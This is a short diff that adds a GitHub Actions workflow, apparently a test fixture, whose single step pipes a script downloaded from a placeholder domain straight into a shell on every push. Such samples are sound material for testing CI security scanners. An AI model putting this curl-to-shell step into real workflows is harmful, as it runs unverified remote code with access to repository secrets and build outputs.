@@ -1,0 +1,7 @@
+name: "ActionWithRemoteScript"
+on: push
+jobs:
+  SomeJob:
+    steps:
+      - name: "curl script and execute"
+        run: curl https://somedomain.com/install.sh | sh
